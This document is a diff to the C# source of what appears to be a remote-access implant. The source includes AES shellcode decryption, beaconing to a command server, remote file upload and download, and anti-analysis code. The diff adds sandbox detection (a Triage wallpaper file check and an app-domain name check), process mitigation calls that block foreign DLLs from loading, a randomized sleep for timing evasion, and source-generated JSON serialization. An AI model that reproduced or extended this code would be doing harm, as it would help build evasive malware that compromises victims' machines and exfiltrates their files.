@@ -1,9 +1,7 @@
 ﻿#define Maverick
-#define Loader
+//#define Loader
 #define AntiGeo
 
-using System.Buffers.Text;
-using System.ComponentModel.DataAnnotations;
 using System.Diagnostics;
 using System.Net;
 using System.Net.Sockets;
@@ -13,10 +11,13 @@ using System.Text;
 using System.Text.Json;
 using System.Text.Json.Serialization;
 using System.Text.Json.Serialization.Metadata;
-using System.Threading.Tasks;
 
 #pragma warning disable IDE1006
 #pragma warning disable IDE0130
+#pragma warning disable IDE0079
+#pragma warning disable IDE0305
+#pragma warning disable CA1872
+#pragma warning disable CA1835
 #pragma warning disable SYSLIB1054
 
 namespace __NS_Crypto__
@@ -91,7 +92,7 @@ namespace __NS_Crypto__
             try
             {
                 byte[] __ShellcodeIV__ = __encShellcode__.Take(16).ToArray();
-                byte[] __ShellcodeKey__ = __ConvertHexStringToBytes__(__NS_Global__.__ClassGlobal__.__KeyShellcode__);
+                byte[] __ShellcodeKey__ = __HexToBytes__(__NS_Global__.__ClassGlobal__.__KeyShellcode__);
                 byte[] __CipherText__ = __encShellcode__.Skip(16).ToArray();
                 using Aes __aesInstance__ = Aes.Create();
                 __aesInstance__.Key = __ShellcodeKey__;
@@ -111,23 +112,21 @@ namespace __NS_Crypto__
             }
         }
 
-        private static byte[] __ConvertHexStringToBytes__(string __inputHexString__)
+        public static string __GetHashPassword__(byte[] __source__)
         {
-            int __length__ = __inputHexString__.Length;
-            if (__length__ % 2 != 0)
-                throw new ArgumentException("Hex string must have an even length.", nameof(__inputHexString__));
-
-            byte[] __bytes__ = new byte[__length__ / 2];
-            for (int __i__ = 0; __i__ < __length__; __i__ += 2)
-            {
-                __bytes__[__i__ / 2] = Convert.ToByte(__inputHexString__.Substring(__i__, 2), 16);
-            }
-            return __bytes__;
+            return BitConverter.ToString(SHA256.Create().ComputeHash(__source__)).Replace("-", "").ToLower();
         }
 
-        public static string __GetHashString__(byte[] __inputBytes__)
+        private static byte[] __HexToBytes__(string __hexString__)
         {
-            return SHA256.HashData(__inputBytes__).ToString().Replace("-", "");
+            int __FinalHexLen__ = __hexString__.Length / 2;
+            byte[] __BytesStorage__ = new byte[__FinalHexLen__];
+            for (int i = 0; i < __FinalHexLen__; i++)
+            {
+                string __HexChar__ = __hexString__.Substring(i * 2, 2);
+                __BytesStorage__[i] = Convert.ToByte(__HexChar__, 16);
+            }
+            return __BytesStorage__;
         }
 #endif
 
@@ -151,6 +150,7 @@ namespace __NS_Global__
     }
 
 #if Maverick
+    [JsonSerializable(typeof(__InfoClientModel__))]
     public class __InfoClientModel__
     {
         public int InternalID { get; set; }
@@ -162,6 +162,7 @@ namespace __NS_Global__
         public string? ClientIP { get; set; }
     }
 
+    [JsonSerializable(typeof(__CommadRequestModel__))]
     public class __CommadRequestModel__
     {
         public int InternalID { get; set; }
@@ -172,11 +173,21 @@ namespace __NS_Global__
         public __FileUploadModel__? FileUpload { get; set; }
     }
 
+    [JsonSerializable(typeof(__FileUploadModel__))]
     public class __FileUploadModel__
     {
         public string? Filename { get; set; }
         public byte[]? FileData { get; set; }
     }
+
+    [JsonSourceGenerationOptions(WriteIndented = false, PropertyNamingPolicy = JsonKnownNamingPolicy.Unspecified)]
+    [JsonSerializable(typeof(__InfoClientModel__))]
+    [JsonSerializable(typeof(__CommadRequestModel__))]
+    [JsonSerializable(typeof(__FileUploadModel__))]
+    internal partial class MyJsonContext : JsonSerializerContext
+    {
+    }
+
 #endif
 }
 
@@ -215,14 +226,12 @@ namespace __NS_ActionFunction__
 {
     public class __ClassActionFunction__
     {
-        public static async Task<__NS_Global__.__FileUploadModel__?> __PerformReadFile__(string __filename__)
+        public static async Task<__NS_Global__.__FileUploadModel__?> __PerformReadFile__(string? __filename__)
         {
             try
             {
-                if (!File.Exists(__filename__))
-                {
-                    return null;
-                }
+                if (string.IsNullOrEmpty(__filename__)) return null;
+                if (!File.Exists(__filename__)) return null;
                 var __FileData__ = await File.ReadAllBytesAsync(__filename__);
                 var __returnModel__ = new __NS_Global__.__FileUploadModel__
                 {
@@ -242,7 +251,7 @@ namespace __NS_ActionFunction__
             try
             {
                 if (__fileToWrite__ == null || __fileToWrite__.FileData == null) return false;
-                string __filename__ = string.IsNullOrEmpty(__nameFromCommand__) ? __fileToWrite__.Filename ?? Guid.NewGuid().ToString() : __nameFromCommand__;
+                string __filename__ = string.IsNullOrEmpty(__nameFromCommand__) ? __fileToWrite__.Filename ?? $"{Guid.NewGuid().ToString()}.dat" : __nameFromCommand__;
                 await File.WriteAllBytesAsync(__filename__, __fileToWrite__.FileData);
                 return true;
             }
@@ -328,10 +337,6 @@ namespace __NS_CommandSender__
         private static int __InternalID__ = 0;
         private static readonly string __LocalIPv4__ = __NS_Utils__.__ClassUtils__.__GetIpv4__();
         private static bool __IsRegisted__ = false;
-        private static JsonSerializerOptions __jsonOptions__ = new()
-        {
-            TypeInfoResolver = new DefaultJsonTypeInfoResolver()
-        }; 
 
         private static byte[] __GenerateClientInfoPayload__()
         {
@@ -345,7 +350,7 @@ namespace __NS_CommandSender__
                 ClientVersion = "1.0.0",
                 ClientIP = __LocalIPv4__
             };
-            return Encoding.UTF8.GetBytes(JsonSerializer.Serialize(__info__, __jsonOptions__));
+            return Encoding.UTF8.GetBytes(JsonSerializer.Serialize(__info__, __NS_Global__.MyJsonContext.Default.__InfoClientModel__));
         }
 
         private static byte[] __GenerateResponseCommand__(__NS_Global__.__CommadRequestModel__ __cmdReqModel__, byte[]? __cmdRes__, __NS_Global__.__FileUploadModel__? __cmdFileModel__)
@@ -359,7 +364,7 @@ namespace __NS_CommandSender__
                 Command = __cmdReqModel__.Command,
                 CommandID = __cmdReqModel__.CommandID
             };
-            return Encoding.UTF8.GetBytes(JsonSerializer.Serialize(__cmdToGen__, __jsonOptions__));
+            return Encoding.UTF8.GetBytes(JsonSerializer.Serialize(__cmdToGen__, __NS_Global__.MyJsonContext.Default.__CommadRequestModel__));
         }
 
         public static async Task __BeaconingAsync__()
@@ -401,7 +406,7 @@ namespace __NS_CommandSender__
                 }
                 catch { }
                 var __rawData__ = await __NS_Crypto__.__ClassCrypto__.__DecryptPayload__(__newCommand__);
-                var __Command__ = JsonSerializer.Deserialize<__NS_Global__.__CommadRequestModel__>(__rawData__, __jsonOptions__);
+                var __Command__ = JsonSerializer.Deserialize(__rawData__, __NS_Global__.MyJsonContext.Default.__CommadRequestModel__);
                 if (__Command__ == null) return;
                 switch (__Command__.ActionType)
                 {
@@ -462,12 +467,18 @@ namespace __NS_Anti__
 {
     public static class __ClassBlockUntrustedDll__
     {
-        [DllImport("ke" + "rne" + "l32.d" + "ll")]
-        private static extern bool SetProcessMitigationPolicy(int __mitigationPolicy__, IntPtr __lpBuffer__, int __dwLength__);
+        [DllImport("ke" + "rne" + "l32.d" + "ll", SetLastError = true)]
+        private static extern bool SetProcessMitigationPolicy(int __mitigationPolicy__, ref uint __lpBuffer__, int __dwLength__);
 
-        public static void __EnableDllBlock__()
+        public static bool __EnableDllBlock__()
         {
-            //fix SetProcessMitigationPolicy
+            uint __policyFlags__ = 5;
+            var __suc__ = SetProcessMitigationPolicy(8, ref __policyFlags__, sizeof(uint));
+            __policyFlags__ = 7;
+            __suc__ = SetProcessMitigationPolicy(10, ref __policyFlags__, sizeof(uint));
+            __policyFlags__ = 1;
+            __suc__ = SetProcessMitigationPolicy(6, ref __policyFlags__, sizeof(uint));
+            return __suc__;
         }
     }
 
@@ -485,7 +496,10 @@ namespace __NS_Anti__
     {
         public static bool __CheckSandbox__()
         {
-            //implement here
+            //implement more here
+            string __triageSandbox__ = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.MyPictures), "My Wallpaper.jpg");
+            if (File.Exists(__triageSandbox__)) return true;
+            if (System.AppDomain.CurrentDomain.FriendlyName.Contains("Sandbox")) return true;
             return false;
         }
     }
@@ -590,6 +604,12 @@ namespace __NS_Program__
             });
             __threadAnti__.IsBackground = true;
             __threadAnti__.Start();
+
+            var __rand__ = new Random();
+            uint __dream__ = (uint)__rand__.Next(2000, 4000);
+            double __delta__ = __dream__ / 1000 - 0.5;
+            System.DateTime before = System.DateTime.Now;
+            System.Threading.Thread.Sleep((int)__dream__);
 
 #if Maverick
             int __counter__ = 0;
